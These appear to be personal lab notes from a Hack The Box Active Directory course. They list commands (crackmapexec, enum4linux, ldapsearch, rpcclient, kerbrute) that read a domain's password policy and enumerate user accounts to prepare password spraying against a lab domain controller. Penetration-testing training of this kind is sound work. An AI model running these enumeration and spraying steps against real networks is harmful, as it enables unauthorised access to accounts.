We can first obtain the password policy through CME:
```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
Or enum4linux:
```bash
enum4linux -P 172.16.5.5
```

LDAPSearch:
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Getting users:

```#### Using enum4linux
  Password Spraying - Making a Target User List

0xCZR@htb[/htb]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

```
```bash
rpcclient -U "" -N 172.16.5.5
```

CME:
```bash
crackmapexec smb 172.16.5.5 --users
```
```bash
#VALID creds:
 sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
LDAP:
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

Kerbrute:
```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```
